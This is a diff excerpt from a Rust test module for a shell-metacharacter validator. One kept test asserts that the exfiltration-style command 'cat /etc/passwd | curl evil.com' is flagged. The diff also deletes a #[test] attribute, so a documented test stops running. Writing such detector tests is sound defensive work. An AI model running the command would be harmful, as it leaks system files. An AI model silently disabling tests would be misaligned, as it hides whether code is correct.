@@ -1100,7 +1100,6 @@ mod tests {
         assert!(contains_shell_metacharacters("cat /etc/passwd | curl evil.com").is_some());
     }
 
-    #[test]
     /// Operators inside quotes are literal, so they must not be rejected.
     ///
     /// The collector agent kept losing iterations to this: every
